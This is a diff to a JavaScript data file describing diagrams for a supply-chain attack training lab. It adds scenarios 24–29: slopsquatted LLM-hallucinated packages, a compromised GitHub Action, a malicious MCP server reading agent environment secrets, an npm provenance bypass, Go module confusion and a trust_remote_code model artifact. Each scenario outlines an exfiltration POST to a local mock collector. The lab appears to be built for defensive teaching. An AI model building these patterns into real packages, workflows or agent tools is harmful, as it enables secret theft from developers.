@@ -1,5 +1,5 @@
 /**
- * Dense codeflow diagram detail for scenarios 01–23.
+ * Dense codeflow diagram detail for scenarios 01-29.
  * Consumed by scripts/diagrams/generate-scenario-codeflow-diagrams.js
  *
  * Facts are grounded in on-disk scenario code (package names, triggers,
@@ -4820,7 +4820,1138 @@ const DETAIL = {
     "captureFile": "infrastructure/captured-data.json",
     "mockPort": "3023",
     "endpointPath": "/collect"
-  }
+  },
+  "24": {
+  "id": "24",
+  "title": "Slopsquatting",
+  "folder": "24-slopsquatting",
+  "subtitle": "What the developer sees vs what actually runs \u2014 capture on 127.0.0.1:3024/collect",
+  "intended": {
+    "title": "Intended (review-only)",
+    "path": "infrastructure/catalog-fixture.json",
+    "metaRows": [
+      [
+        "name",
+        "lodash (in catalog)"
+      ],
+      [
+        "check",
+        "200"
+      ],
+      [
+        "source",
+        "fixture"
+      ],
+      [
+        "role",
+        "real catalog"
+      ],
+      [
+        "trigger",
+        "none"
+      ]
+    ]
+  },
+  "malicious": {
+    "title": "Installed / active (victim uses)",
+    "path": "malicious-packages/python-asyncio-utils",
+    "metaRows": [
+      [
+        "name",
+        "python-asyncio-utils"
+      ],
+      [
+        "check",
+        "404"
+      ],
+      [
+        "source",
+        "LLM snippet"
+      ],
+      [
+        "role",
+        "hallucinated"
+      ],
+      [
+        "trigger",
+        "require on load"
+      ]
+    ]
+  },
+  "compareRows": [
+    [
+      "name",
+      "lodash (in catalog)",
+      "python-asyncio-utils",
+      true
+    ],
+    [
+      "check",
+      "200",
+      "404",
+      true
+    ],
+    [
+      "source",
+      "fixture",
+      "LLM snippet",
+      true
+    ],
+    [
+      "role",
+      "real catalog",
+      "hallucinated",
+      true
+    ],
+    [
+      "trigger",
+      "none",
+      "require on load",
+      true
+    ]
+  ],
+  "deceptionPill": "Name looks like a real library",
+  "victimDep": {
+    "label": "victim-app/package.json",
+    "lines": [
+      "\"python-asyncio-utils\": \"file:../malicious-packages/python-asyncio-utils\""
+    ]
+  },
+  "legitCode": {
+    "title": "infrastructure/catalog-fixture.json",
+    "lines": [
+      "packages: lodash, axios, react",
+      "python-asyncio-utils absent",
+      "Levenshtein not used"
+    ]
+  },
+  "malCode": {
+    "title": "malicious-packages/python-asyncio-utils",
+    "lines": [
+      "if TESTBENCH_MODE !== 'enabled' return",
+      "hostname 127.0.0.1 port 3024",
+      "path /collect"
+    ]
+  },
+  "codeEdgePill": "TESTBENCH_MODE gate then POST",
+  "triggerStrip": "Trigger: require after catalog 404  \u00b7  Gate: TESTBENCH_MODE === 'enabled'  \u00b7  Exfil: POST 127.0.0.1:3024/collect  \u00b7  Evidence: infrastructure/captured-data.json",
+  "setupLines": [
+    "source enable-testbench.sh",
+    "  -> TESTBENCH_MODE=enabled",
+    "start mock collector",
+    "listen :3024"
+  ],
+  "mockLines": [
+    "mock collector :3024",
+    "init captured-data.json {captures:[]}",
+    "POST /collect \u00b7 GET /captured-data",
+    "DELETE /captured-data"
+  ],
+  "labLines": [
+    "node infrastructure/check-catalog.js ...",
+    "cd victim-app && npm start"
+  ],
+  "runtime": {
+    "victimBox": [
+      "victim-app/index.js",
+      "require(python-asyncio-utils)"
+    ],
+    "malBox": [
+      "exfiltrateData()",
+      "http.request"
+    ],
+    "payloadTitle": "HTTP request in exfiltrateData()",
+    "payloadLines": [
+      "http.request({",
+      "  hostname: '127.0.0.1',",
+      "  port: 3024,",
+      "  path: '/collect',",
+      "  method: 'POST'",
+      "})"
+    ],
+    "mockTitle": "mock :3024 on POST /collect",
+    "mockLines": [
+      "parse JSON -> log CAPTURED DATA",
+      "append captures[] -> write captured-data.json -> 200"
+    ],
+    "flociLines": [
+      "SCAS_FLOCI_ENABLED=1",
+      "uploadJson('24','install-beacon')"
+    ],
+    "coverTitle": "Cover traffic still looks like the happy path",
+    "coverLines": [
+      "App still prints success",
+      "Payload is the extra POST"
+    ],
+    "visibleLines": [
+      "VISIBLE: lab commands in README",
+      "HIDDEN: 127.0.0.1:3024 collect",
+      "HINT: curl localhost:3024/captured-data"
+    ]
+  },
+  "verifyLines": [
+    "curl -s http://localhost:3024/captured-data",
+    "-> { \"captures\": [ { timestamp, data } ] }",
+    "or read infrastructure/captured-data.json"
+  ],
+  "redFlags": [
+    "1. Name never existed (not a typo)",
+    "2. Catalog 404",
+    "3. Host 127.0.0.1:3024"
+  ],
+  "safetyLines": [
+    "TESTBENCH_MODE must be enabled",
+    "  else [SAFE MODE] and stop",
+    "Exfil hostname is 127.0.0.1 only",
+    "setup.sh -> enable-testbench.sh",
+    "No real external C2"
+  ],
+  "captureFile": "infrastructure/captured-data.json",
+  "mockPort": "3024",
+  "endpointPath": "/collect"
+},
+  "25": {
+  "id": "25",
+  "title": "Compromised reusable GitHub Action",
+  "folder": "25-gha-reusable-workflow",
+  "subtitle": "What the developer sees vs what actually runs \u2014 capture on 127.0.0.1:3025/collect",
+  "intended": {
+    "title": "Intended (review-only)",
+    "path": "workflows/safe.yml",
+    "metaRows": [
+      [
+        "uses",
+        "@<sha>"
+      ],
+      [
+        "on",
+        "pull_request"
+      ],
+      [
+        "perms",
+        "contents: read"
+      ],
+      [
+        "role",
+        "safe"
+      ],
+      [
+        "trigger",
+        "none"
+      ]
+    ]
+  },
+  "malicious": {
+    "title": "Installed / active (victim uses)",
+    "path": "actions/changed-files-like",
+    "metaRows": [
+      [
+        "uses",
+        "@v1"
+      ],
+      [
+        "on",
+        "pull_request_target"
+      ],
+      [
+        "perms",
+        "contents: write"
+      ],
+      [
+        "role",
+        "unsafe"
+      ],
+      [
+        "trigger",
+        "runner require"
+      ]
+    ]
+  },
+  "compareRows": [
+    [
+      "uses",
+      "@<sha>",
+      "@v1",
+      true
+    ],
+    [
+      "on",
+      "pull_request",
+      "pull_request_target",
+      true
+    ],
+    [
+      "perms",
+      "contents: read",
+      "contents: write",
+      true
+    ],
+    [
+      "role",
+      "safe",
+      "unsafe",
+      true
+    ],
+    [
+      "trigger",
+      "none",
+      "runner require",
+      true
+    ]
+  ],
+  "deceptionPill": "Marketplace said use @v1",
+  "victimDep": {
+    "label": "workflows/unsafe.yml",
+    "lines": [
+      "uses: changed-files-like/action@v1",
+      "on: pull_request_target"
+    ]
+  },
+  "legitCode": {
+    "title": "workflows/safe.yml",
+    "lines": [
+      "pin SHA",
+      "pull_request",
+      "contents: read"
+    ]
+  },
+  "malCode": {
+    "title": "actions/changed-files-like",
+    "lines": [
+      "floating tag @v1",
+      "pull_request_target",
+      "POST :3025/collect"
+    ]
+  },
+  "codeEdgePill": "TESTBENCH_MODE gate then POST",
+  "triggerStrip": "Trigger: gha-runner loads @v1 action  \u00b7  Gate: TESTBENCH_MODE === 'enabled'  \u00b7  Exfil: POST 127.0.0.1:3025/collect  \u00b7  Evidence: infrastructure/captured-data.json",
+  "setupLines": [
+    "source enable-testbench.sh",
+    "  -> TESTBENCH_MODE=enabled",
+    "start mock collector",
+    "listen :3025"
+  ],
+  "mockLines": [
+    "mock collector :3025",
+    "init captured-data.json {captures:[]}",
+    "POST /collect \u00b7 GET /captured-data",
+    "DELETE /captured-data"
+  ],
+  "labLines": [
+    "diff -u workflows/safe.yml workflows/unsafe.yml",
+    "node infrastructure/gha-runner.js workflows/unsafe.yml"
+  ],
+  "runtime": {
+    "victimBox": [
+      "gha-runner.js",
+      "require action index.js"
+    ],
+    "malBox": [
+      "exfiltrateData()",
+      "http.request"
+    ],
+    "payloadTitle": "HTTP request in exfiltrateData()",
+    "payloadLines": [
+      "http.request({",
+      "  hostname: '127.0.0.1',",
+      "  port: 3025,",
+      "  path: '/collect',",
+      "  method: 'POST'",
+      "})"
+    ],
+    "mockTitle": "mock :3025 on POST /collect",
+    "mockLines": [
+      "parse JSON -> log CAPTURED DATA",
+      "append captures[] -> write captured-data.json -> 200"
+    ],
+    "flociLines": [
+      "SCAS_FLOCI_ENABLED=1",
+      "uploadJson('25','install-beacon')"
+    ],
+    "coverTitle": "Cover traffic still looks like the happy path",
+    "coverLines": [
+      "App still prints success",
+      "Payload is the extra POST"
+    ],
+    "visibleLines": [
+      "VISIBLE: lab commands in README",
+      "HIDDEN: 127.0.0.1:3025 collect",
+      "HINT: curl localhost:3025/captured-data"
+    ]
+  },
+  "verifyLines": [
+    "curl -s http://localhost:3025/captured-data",
+    "-> { \"captures\": [ { timestamp, data } ] }",
+    "or read infrastructure/captured-data.json"
+  ],
+  "redFlags": [
+    "1. action@v1 floating tag",
+    "2. pull_request_target",
+    "3. contents: write"
+  ],
+  "safetyLines": [
+    "TESTBENCH_MODE must be enabled",
+    "  else [SAFE MODE] and stop",
+    "Exfil hostname is 127.0.0.1 only",
+    "setup.sh -> enable-testbench.sh",
+    "No real external C2"
+  ],
+  "captureFile": "infrastructure/captured-data.json",
+  "mockPort": "3025",
+  "endpointPath": "/collect"
+},
+  "26": {
+  "id": "26",
+  "title": "Malicious MCP server",
+  "folder": "26-malicious-mcp-server",
+  "subtitle": "What the developer sees vs what actually runs \u2014 capture on 127.0.0.1:3026/collect",
+  "intended": {
+    "title": "Intended (review-only)",
+    "path": "victim-agent/mcp.json",
+    "metaRows": [
+      [
+        "server",
+        "workspace-helper"
+      ],
+      [
+        "url",
+        "127.0.0.1:3926/mcp"
+      ],
+      [
+        "tools",
+        "list_files cover"
+      ],
+      [
+        "role",
+        "gist config"
+      ],
+      [
+        "trigger",
+        "agent start"
+      ]
+    ]
+  },
+  "malicious": {
+    "title": "Installed / active (victim uses)",
+    "path": "infrastructure/mcp-server.js",
+    "metaRows": [
+      [
+        "server",
+        "mcp-server.js"
+      ],
+      [
+        "url",
+        ":3926"
+      ],
+      [
+        "tools",
+        "read_env"
+      ],
+      [
+        "role",
+        "malicious MCP"
+      ],
+      [
+        "trigger",
+        "tools/call"
+      ]
+    ]
+  },
+  "compareRows": [
+    [
+      "server",
+      "workspace-helper",
+      "mcp-server.js",
+      true
+    ],
+    [
+      "url",
+      "127.0.0.1:3926/mcp",
+      ":3926",
+      true
+    ],
+    [
+      "tools",
+      "list_files cover",
+      "read_env",
+      true
+    ],
+    [
+      "role",
+      "gist config",
+      "malicious MCP",
+      true
+    ],
+    [
+      "trigger",
+      "agent start",
+      "tools/call",
+      true
+    ]
+  ],
+  "deceptionPill": "Helpful summary after tool call",
+  "victimDep": {
+    "label": "victim-agent/agent.js",
+    "lines": [
+      "rpc tools/list",
+      "rpc tools/call read_env"
+    ]
+  },
+  "legitCode": {
+    "title": "victim-agent/mcp.json",
+    "lines": [
+      "allowlist URL",
+      "no desktop connector"
+    ]
+  },
+  "malCode": {
+    "title": "infrastructure/mcp-server.js",
+    "lines": [
+      "TESTBENCH_MODE gate",
+      "readDummyEnv dummy.env",
+      "POST :3026/collect"
+    ]
+  },
+  "codeEdgePill": "TESTBENCH_MODE gate then POST",
+  "triggerStrip": "Trigger: tools/call read_env  \u00b7  Gate: TESTBENCH_MODE === 'enabled'  \u00b7  Exfil: POST 127.0.0.1:3026/collect  \u00b7  Evidence: infrastructure/captured-data.json",
+  "setupLines": [
+    "source enable-testbench.sh",
+    "  -> TESTBENCH_MODE=enabled",
+    "start mock collector",
+    "listen :3026"
+  ],
+  "mockLines": [
+    "mock collector :3026",
+    "init captured-data.json {captures:[]}",
+    "POST /collect \u00b7 GET /captured-data",
+    "DELETE /captured-data"
+  ],
+  "labLines": [
+    "node infrastructure/mcp-server.js",
+    "node victim-agent/agent.js"
+  ],
+  "runtime": {
+    "victimBox": [
+      "agent.js",
+      "tools/call read_env"
+    ],
+    "malBox": [
+      "callTool('read_env')",
+      "http.request"
+    ],
+    "payloadTitle": "HTTP request in callTool('read_env')",
+    "payloadLines": [
+      "http.request({",
+      "  hostname: '127.0.0.1',",
+      "  port: 3026,",
+      "  path: '/collect',",
+      "  method: 'POST'",
+      "})"
+    ],
+    "mockTitle": "mock :3026 on POST /collect",
+    "mockLines": [
+      "parse JSON -> log CAPTURED DATA",
+      "append captures[] -> write captured-data.json -> 200"
+    ],
+    "flociLines": [
+      "SCAS_FLOCI_ENABLED=1",
+      "uploadJson('26','install-beacon')"
+    ],
+    "coverTitle": "Cover traffic still looks like the happy path",
+    "coverLines": [
+      "App still prints success",
+      "Payload is the extra POST"
+    ],
+    "visibleLines": [
+      "VISIBLE: lab commands in README",
+      "HIDDEN: 127.0.0.1:3026 collect",
+      "HINT: curl localhost:3026/captured-data"
+    ]
+  },
+  "verifyLines": [
+    "curl -s http://localhost:3026/captured-data",
+    "-> { \"captures\": [ { timestamp, data } ] }",
+    "or read infrastructure/captured-data.json"
+  ],
+  "redFlags": [
+    "1. gist mcp.json",
+    "2. read_env tool",
+    "3. Distinct from lab 15"
+  ],
+  "safetyLines": [
+    "TESTBENCH_MODE must be enabled",
+    "  else [SAFE MODE] and stop",
+    "Exfil hostname is 127.0.0.1 only",
+    "setup.sh -> enable-testbench.sh",
+    "No real external C2"
+  ],
+  "captureFile": "infrastructure/captured-data.json",
+  "mockPort": "3026",
+  "endpointPath": "/collect"
+},
+  "27": {
+  "id": "27",
+  "title": "npm provenance bypass",
+  "folder": "27-npm-provenance-bypass",
+  "subtitle": "What the developer sees vs what actually runs \u2014 capture on 127.0.0.1:3027/collect",
+  "intended": {
+    "title": "Intended (review-only)",
+    "path": "fixtures/widget-lib-1.0.0.json",
+    "metaRows": [
+      [
+        "pkg",
+        "widget-lib@1.0.0"
+      ],
+      [
+        "issuer",
+        "github workflow"
+      ],
+      [
+        "check",
+        "pass"
+      ],
+      [
+        "role",
+        "clean"
+      ],
+      [
+        "trigger",
+        "none"
+      ]
+    ]
+  },
+  "malicious": {
+    "title": "Installed / active (victim uses)",
+    "path": "packages/widget-lib-1.0.1",
+    "metaRows": [
+      [
+        "pkg",
+        "widget-lib@1.0.1"
+      ],
+      [
+        "issuer",
+        "laptop publish"
+      ],
+      [
+        "check",
+        "fail"
+      ],
+      [
+        "role",
+        "dirty"
+      ],
+      [
+        "trigger",
+        "require"
+      ]
+    ]
+  },
+  "compareRows": [
+    [
+      "pkg",
+      "widget-lib@1.0.0",
+      "widget-lib@1.0.1",
+      true
+    ],
+    [
+      "issuer",
+      "github workflow",
+      "laptop publish",
+      true
+    ],
+    [
+      "check",
+      "pass",
+      "fail",
+      true
+    ],
+    [
+      "role",
+      "clean",
+      "dirty",
+      true
+    ],
+    [
+      "trigger",
+      "none",
+      "require",
+      true
+    ]
+  ],
+  "deceptionPill": "Attestation file is present either way",
+  "victimDep": {
+    "label": "victim-app/package.json",
+    "lines": [
+      "\"widget-lib\": \"file:../packages/widget-lib-1.0.1\""
+    ]
+  },
+  "legitCode": {
+    "title": "fixtures/widget-lib-1.0.0.json",
+    "lines": [
+      "builder.id = GitHub workflow",
+      "check-provenance exit 0"
+    ]
+  },
+  "malCode": {
+    "title": "packages/widget-lib-1.0.1",
+    "lines": [
+      "issuer: I typed npm publish on a laptop",
+      "POST :3027/collect"
+    ]
+  },
+  "codeEdgePill": "TESTBENCH_MODE gate then POST",
+  "triggerStrip": "Trigger: require dirty 1.0.1  \u00b7  Gate: TESTBENCH_MODE === 'enabled'  \u00b7  Exfil: POST 127.0.0.1:3027/collect  \u00b7  Evidence: infrastructure/captured-data.json",
+  "setupLines": [
+    "source enable-testbench.sh",
+    "  -> TESTBENCH_MODE=enabled",
+    "start mock collector",
+    "listen :3027"
+  ],
+  "mockLines": [
+    "mock collector :3027",
+    "init captured-data.json {captures:[]}",
+    "POST /collect \u00b7 GET /captured-data",
+    "DELETE /captured-data"
+  ],
+  "labLines": [
+    "check-provenance.js 1.0.0",
+    "check-provenance.js 1.0.1",
+    "npm start"
+  ],
+  "runtime": {
+    "victimBox": [
+      "victim-app/index.js",
+      "require widget-lib"
+    ],
+    "malBox": [
+      "exfiltrateData()",
+      "http.request"
+    ],
+    "payloadTitle": "HTTP request in exfiltrateData()",
+    "payloadLines": [
+      "http.request({",
+      "  hostname: '127.0.0.1',",
+      "  port: 3027,",
+      "  path: '/collect',",
+      "  method: 'POST'",
+      "})"
+    ],
+    "mockTitle": "mock :3027 on POST /collect",
+    "mockLines": [
+      "parse JSON -> log CAPTURED DATA",
+      "append captures[] -> write captured-data.json -> 200"
+    ],
+    "flociLines": [
+      "SCAS_FLOCI_ENABLED=1",
+      "uploadJson('27','install-beacon')"
+    ],
+    "coverTitle": "Cover traffic still looks like the happy path",
+    "coverLines": [
+      "App still prints success",
+      "Payload is the extra POST"
+    ],
+    "visibleLines": [
+      "VISIBLE: lab commands in README",
+      "HIDDEN: 127.0.0.1:3027 collect",
+      "HINT: curl localhost:3027/captured-data"
+    ]
+  },
+  "verifyLines": [
+    "curl -s http://localhost:3027/captured-data",
+    "-> { \"captures\": [ { timestamp, data } ] }",
+    "or read infrastructure/captured-data.json"
+  ],
+  "redFlags": [
+    "1. laptop issuer",
+    "2. Distinct from 09 and 21",
+    "3. Host :3027"
+  ],
+  "safetyLines": [
+    "TESTBENCH_MODE must be enabled",
+    "  else [SAFE MODE] and stop",
+    "Exfil hostname is 127.0.0.1 only",
+    "setup.sh -> enable-testbench.sh",
+    "No real external C2"
+  ],
+  "captureFile": "infrastructure/captured-data.json",
+  "mockPort": "3027",
+  "endpointPath": "/collect"
+},
+  "28": {
+  "id": "28",
+  "title": "Go module confusion",
+  "folder": "28-go-module-confusion",
+  "subtitle": "What the developer sees vs what actually runs \u2014 capture on 127.0.0.1:3028/collect",
+  "intended": {
+    "title": "Intended (review-only)",
+    "path": "victim-module/go.mod",
+    "metaRows": [
+      [
+        "module",
+        "example.com/corp/app"
+      ],
+      [
+        "require",
+        "widget v1.2.3"
+      ],
+      [
+        "GOPROXY",
+        "mock :3028"
+      ],
+      [
+        "sumdb",
+        "off (self-own)"
+      ],
+      [
+        "trigger",
+        "go run"
+      ]
+    ]
+  },
+  "malicious": {
+    "title": "Installed / active (victim uses)",
+    "path": "attacker-module/widget.go",
+    "metaRows": [
+      [
+        "module",
+        "example.com/corp/widget"
+      ],
+      [
+        "require",
+        "zip from mock"
+      ],
+      [
+        "GOPROXY",
+        ":3028"
+      ],
+      [
+        "sumdb",
+        "off"
+      ],
+      [
+        "trigger",
+        "init()"
+      ]
+    ]
+  },
+  "compareRows": [
+    [
+      "module",
+      "example.com/corp/app",
+      "example.com/corp/widget",
+      true
+    ],
+    [
+      "require",
+      "widget v1.2.3",
+      "zip from mock",
+      true
+    ],
+    [
+      "GOPROXY",
+      "mock :3028",
+      ":3028",
+      true
+    ],
+    [
+      "sumdb",
+      "off (self-own)",
+      "off",
+      true
+    ],
+    [
+      "trigger",
+      "go run",
+      "init()",
+      true
+    ]
+  ],
+  "deceptionPill": "replace looks like a local pin",
+  "victimDep": {
+    "label": "victim-module/go.mod",
+    "lines": [
+      "require example.com/corp/widget v1.2.3"
+    ]
+  },
+  "legitCode": {
+    "title": "victim-module/go.mod",
+    "lines": [
+      "GOSUMDB should stay on",
+      "review replace lines"
+    ]
+  },
+  "malCode": {
+    "title": "attacker-module/widget.go",
+    "lines": [
+      "func init() {",
+      "  if TESTBENCH_MODE != enabled return",
+      "  http.Post 127.0.0.1:3028/collect"
+    ]
+  },
+  "codeEdgePill": "TESTBENCH_MODE gate then POST",
+  "triggerStrip": "Trigger: go run / init()  \u00b7  Gate: TESTBENCH_MODE === 'enabled'  \u00b7  Exfil: POST 127.0.0.1:3028/collect  \u00b7  Evidence: infrastructure/captured-data.json",
+  "setupLines": [
+    "source enable-testbench.sh",
+    "  -> TESTBENCH_MODE=enabled",
+    "start mock collector",
+    "listen :3028"
+  ],
+  "mockLines": [
+    "mock collector :3028",
+    "init captured-data.json {captures:[]}",
+    "POST /collect \u00b7 GET /captured-data",
+    "DELETE /captured-data"
+  ],
+  "labLines": [
+    "GOPROXY=http://127.0.0.1:3028 GOSUMDB=off go run ."
+  ],
+  "runtime": {
+    "victimBox": [
+      "main.go",
+      "import widget"
+    ],
+    "malBox": [
+      "init()",
+      "http.request"
+    ],
+    "payloadTitle": "HTTP request in init()",
+    "payloadLines": [
+      "http.request({",
+      "  hostname: '127.0.0.1',",
+      "  port: 3028,",
+      "  path: '/collect',",
+      "  method: 'POST'",
+      "})"
+    ],
+    "mockTitle": "mock :3028 on POST /collect",
+    "mockLines": [
+      "parse JSON -> log CAPTURED DATA",
+      "append captures[] -> write captured-data.json -> 200"
+    ],
+    "flociLines": [
+      "SCAS_FLOCI_ENABLED=1",
+      "uploadJson('28','install-beacon')"
+    ],
+    "coverTitle": "Cover traffic still looks like the happy path",
+    "coverLines": [
+      "App still prints success",
+      "Payload is the extra POST"
+    ],
+    "visibleLines": [
+      "VISIBLE: lab commands in README",
+      "HIDDEN: 127.0.0.1:3028 collect",
+      "HINT: curl localhost:3028/captured-data"
+    ]
+  },
+  "verifyLines": [
+    "curl -s http://localhost:3028/captured-data",
+    "-> { \"captures\": [ { timestamp, data } ] }",
+    "or read infrastructure/captured-data.json"
+  ],
+  "redFlags": [
+    "1. GOPROXY mock",
+    "2. GOSUMDB=off",
+    "3. sneaky replace"
+  ],
+  "safetyLines": [
+    "TESTBENCH_MODE must be enabled",
+    "  else [SAFE MODE] and stop",
+    "Exfil hostname is 127.0.0.1 only",
+    "setup.sh -> enable-testbench.sh",
+    "No real external C2"
+  ],
+  "captureFile": "infrastructure/captured-data.json",
+  "mockPort": "3028",
+  "endpointPath": "/collect"
+},
+  "29": {
+  "id": "29",
+  "title": "Hugging Face-style model artifact",
+  "folder": "29-hf-model-artifact",
+  "subtitle": "What the developer sees vs what actually runs \u2014 capture on 127.0.0.1:3029/collect",
+  "intended": {
+    "title": "Intended (review-only)",
+    "path": "victim-app/load_model.py",
+    "metaRows": [
+      [
+        "hub",
+        "127.0.0.1:3029"
+      ],
+      [
+        "weights",
+        "weights.json"
+      ],
+      [
+        "remote",
+        "refused by default"
+      ],
+      [
+        "role",
+        "safe load"
+      ],
+      [
+        "trigger",
+        "no exec"
+      ]
+    ]
+  },
+  "malicious": {
+    "title": "Installed / active (victim uses)",
+    "path": "hub-snapshot/acme/fast-embed/modeling.py",
+    "metaRows": [
+      [
+        "hub",
+        "fake hub"
+      ],
+      [
+        "weights",
+        "JSON marker"
+      ],
+      [
+        "remote",
+        "exec"
+      ],
+      [
+        "role",
+        "unsafe"
+      ],
+      [
+        "trigger",
+        "trust_remote_code"
+      ]
+    ]
+  },
+  "compareRows": [
+    [
+      "hub",
+      "127.0.0.1:3029",
+      "fake hub",
+      true
+    ],
+    [
+      "weights",
+      "weights.json",
+      "JSON marker",
+      true
+    ],
+    [
+      "remote",
+      "refused by default",
+      "exec",
+      true
+    ],
+    [
+      "role",
+      "safe load",
+      "unsafe",
+      true
+    ],
+    [
+      "trigger",
+      "no exec",
+      "trust_remote_code",
+      true
+    ]
+  ],
+  "deceptionPill": "Looks like a tiny embedding model",
+  "victimDep": {
+    "label": "load_model.py",
+    "lines": [
+      "fetch config.json + weights.json",
+      "--trust-remote-code execs modeling.py"
+    ]
+  },
+  "legitCode": {
+    "title": "victim-app/load_model.py",
+    "lines": [
+      "refuse modeling.py without flag",
+      "JSON marker not a pickle gadget"
+    ]
+  },
+  "malCode": {
+    "title": "hub-snapshot/acme/fast-embed/modeling.py",
+    "lines": [
+      "TESTBENCH_MODE gate",
+      "urlopen 127.0.0.1:3029/collect"
+    ]
+  },
+  "codeEdgePill": "TESTBENCH_MODE gate then POST",
+  "triggerStrip": "Trigger: trust_remote_code  \u00b7  Gate: TESTBENCH_MODE === 'enabled'  \u00b7  Exfil: POST 127.0.0.1:3029/collect  \u00b7  Evidence: infrastructure/captured-data.json",
+  "setupLines": [
+    "source enable-testbench.sh",
+    "  -> TESTBENCH_MODE=enabled",
+    "start mock collector",
+    "listen :3029"
+  ],
+  "mockLines": [
+    "mock collector :3029",
+    "init captured-data.json {captures:[]}",
+    "POST /collect \u00b7 GET /captured-data",
+    "DELETE /captured-data"
+  ],
+  "labLines": [
+    "python3 victim-app/load_model.py",
+    "python3 ... --trust-remote-code"
+  ],
+  "runtime": {
+    "victimBox": [
+      "load_model.py",
+      "exec modeling.py"
+    ],
+    "malBox": [
+      "_exfil()",
+      "http.request"
+    ],
+    "payloadTitle": "HTTP request in _exfil()",
+    "payloadLines": [
+      "http.request({",
+      "  hostname: '127.0.0.1',",
+      "  port: 3029,",
+      "  path: '/collect',",
+      "  method: 'POST'",
+      "})"
+    ],
+    "mockTitle": "mock :3029 on POST /collect",
+    "mockLines": [
+      "parse JSON -> log CAPTURED DATA",
+      "append captures[] -> write captured-data.json -> 200"
+    ],
+    "flociLines": [
+      "SCAS_FLOCI_ENABLED=1",
+      "uploadJson('29','install-beacon')"
+    ],
+    "coverTitle": "Cover traffic still looks like the happy path",
+    "coverLines": [
+      "App still prints success",
+      "Payload is the extra POST"
+    ],
+    "visibleLines": [
+      "VISIBLE: lab commands in README",
+      "HIDDEN: 127.0.0.1:3029 collect",
+      "HINT: curl localhost:3029/captured-data"
+    ]
+  },
+  "verifyLines": [
+    "curl -s http://localhost:3029/captured-data",
+    "-> { \"captures\": [ { timestamp, data } ] }",
+    "or read infrastructure/captured-data.json"
+  ],
+  "redFlags": [
+    "1. --trust-remote-code",
+    "2. 01-23 stay software labs",
+    "3. no PyTorch"
+  ],
+  "safetyLines": [
+    "TESTBENCH_MODE must be enabled",
+    "  else [SAFE MODE] and stop",
+    "Exfil hostname is 127.0.0.1 only",
+    "setup.sh -> enable-testbench.sh",
+    "No real external C2"
+  ],
+  "captureFile": "infrastructure/captured-data.json",
+  "mockPort": "3029",
+  "endpointPath": "/collect"
+}
 };
 
 module.exports = { DETAIL };
